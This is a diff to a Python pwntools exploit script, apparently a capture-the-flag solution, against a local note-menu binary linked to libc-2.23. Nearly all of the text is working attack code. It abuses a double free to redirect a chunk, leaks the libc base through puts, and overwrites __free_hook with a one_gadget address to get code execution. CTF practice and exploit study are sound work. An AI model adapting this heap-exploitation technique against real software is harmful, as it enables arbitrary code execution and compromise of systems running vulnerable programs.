@@ -2,16 +2,17 @@ from pwn import *
 
 #context(os='linux', arch='amd64', log_level='debug')
 
-p = process('./randomm')
-
-elf = ELF('./randomm')
+p = process('./random')
+#author : chris   
+#blog : sirhc.xyz
+elf = ELF('./random')
 libc = ELF('./libc-2.23.so')
 
 def g(p):
     gdb.attach(p)
     raw_input()
 
-def add(size, content, another_note):
+def add(size, content, another):
     p.recvuntil('?(Y/N)\n')
     p.sendline('Y')
     p.recvuntil('Input the size of the note:\n')
@@ -19,7 +20,7 @@ def add(size, content, another_note):
     p.recvuntil('Input the content of the note:\n')
     p.send(content)
     p.recvuntil('Do you want to add another note, tomorrow?(Y/N)\n')
-    if(another_note):
+    if(another):
         p.sendline('Y')
     else:
         p.sendline('N')
@@ -43,8 +44,6 @@ def view(index):
     p.sendline('Y')
     p.recvuntil('Input the index of the note:\n')
     p.sendline(str(index))
-    result = p.recvuntil('\n')
-    return result[:-1]
 
 def no(num):
     for i in range(int(num)):
@@ -66,7 +65,7 @@ p.sendline('30')
 
 p.recvuntil('How many times do you want to play this game today?(0~10)\n')
 p.sendline('8')  # 8 add
-add(17, 'bbbb\n', True) # index 0
+add(17, '\n', True) # index 0
 no(7)
 
 p.recvuntil('How many times do you want to play this game today?(0~10)\n')
@@ -83,7 +82,7 @@ no(1)
 p.recvuntil('How many times do you want to play this game today?(0~10)\n')
 p.sendline('2') # 19 add
 offset = 0x203180
-add(17, p64(image_base_addr + offset+0x10) + '\n', False) ## index 2  // set double_free_chunk -> attack_address
+add(17, p64(image_base_addr + offset+0x10) + '\n', False) ## index 2  // set double_free_chunk -> attack_address(qword_203180 +0x10)
 no(1)
 
 p.recvuntil('How many times do you want to play this game today?(0~10)\n')
@@ -113,8 +112,8 @@ no(1)
 
 ## leak libc address and fill __free_hook into one_gadget
 
-result = view(2)
-libc_base_addr = u64(result.ljust(8, '\0')) - libc.symbols['puts']
+view(2)
+libc_base_addr = u64(p.recv(6).ljust(8, '\0')) - libc.symbols['puts']
 print 'libc_base_addr: ' + hex(libc_base_addr)
 one_gadget=libc_base_addr+0x4526a
 update(0, p64(libc_base_addr + libc.symbols['__free_hook'])+p64(0x11) + '\n')
